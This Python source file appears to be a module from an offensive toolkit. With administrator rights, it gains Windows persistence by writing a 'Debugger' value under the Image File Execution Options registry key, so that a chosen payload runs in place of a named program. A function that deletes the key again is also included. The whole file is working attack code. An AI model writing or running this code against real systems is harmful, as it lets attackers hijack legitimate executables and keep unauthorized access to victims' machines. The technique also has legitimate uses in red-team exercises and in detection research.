import os
import wmi
import ctypes
import _winreg
from core.prints import *

wmi = wmi.WMI()

def architecture():
	for os in wmi.Win32_OperatingSystem():
		return os.OSArchitecture

def reg_delete(path,process):
	try:
		key = _winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE,os.path.join(path),0,_winreg.KEY_ALL_ACCESS)
		_winreg.DeleteKey(key,process)
		_winreg.CloseKey(key)
	except Exception as error:
		return False
	else:
		return True

def reg_create(path,process,payload):
	try:
		key = _winreg.CreateKey(_winreg.HKEY_LOCAL_MACHINE,os.path.join(path,process))
		_winreg.SetValueEx(key,"Debugger",0,_winreg.REG_SZ,payload)
		_winreg.CloseKey(key)
	except Exception as error:
		return False
	else:
		return True
		
def ifeo_delete(process):
	"""
	Delete persistence by calling this function
	"""	
	if (ctypes.windll.shell32.IsUserAnAdmin() == True):		
		if ("64" in architecture()):
			if (reg_delete("Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options",process) == True):
				print_success("Successfully deleted persistence key")
			else:
				print_error("Unable to delete persistence key")
				return False
		else:
			if (reg_delete("Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options",process) == True):
				print_success("Successfully deleted persistence key")
			else:
				print_error("Unable to delete persistence key")
				return False
	else:
		print_error("Unable to delete persistence key, we are not elevated")
		return False

def ifeo(process,payload):
	print """
 -------------------------------------------------------------
 Persistence technique using Image File Execution Option
 Debugger key, the payload provided will run instead of the
 actual executable upon execution.
 
 When everything worked correctly, we should gain persistence
 with current user privledges.
 -------------------------------------------------------------
 """
	print_info("Process: {}".format(process))
	print_info("Payload: {}".format(payload))
	
	if (ctypes.windll.shell32.IsUserAnAdmin() == True):
		if ("64" in architecture()):
			if (reg_create("Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options",process,payload) == True):
				print_success("Successfully created persistence key")
			else:
				print_error("Unable to create persistence key")
				return False
		else:
			if (reg_create("Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options",process,payload) == True):
				print_success("Successfully created persistence key")
			else:
				print_error("Unable to create persistence key")
				return False
	else:
		print_error("Unable to create persistence key, we are not elevated")
		return False
